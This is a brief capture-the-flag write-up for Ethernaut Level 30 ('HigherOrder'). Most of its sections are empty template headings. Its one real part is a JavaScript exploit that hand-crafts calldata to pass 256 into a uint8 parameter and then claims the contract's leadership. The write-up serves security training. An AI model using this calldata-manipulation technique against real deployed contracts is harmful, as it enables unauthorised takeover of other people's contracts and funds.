[Level 30. HigherOrder](https://ethernaut.openzeppelin.com/level/30)

## In A Nutshell

> 

## Concept

1. 

## Level Target

1. Become the `commander` of the `HigherOrder`.

## Breakdown & Analysis

1. 

## Detailed Steps

```js
const from = <your wallet address>;
const to = contract.address;
// 211c85ab -> function selector of registerTreasury(uint8); 000...100 -> parameter 256
const calldata = "0x211c85ab0000000000000000000000000000000000000000000000000000000000000100";

await ethereum.request({
    method: "eth_sendTransaction",
    params: [{
        from: from,
        to: to,
        data: calldata
    }]
})

await contract.treasury().then(v => v.toString()) // check if treasury is set to 256
await contract.claimLeadership();
```
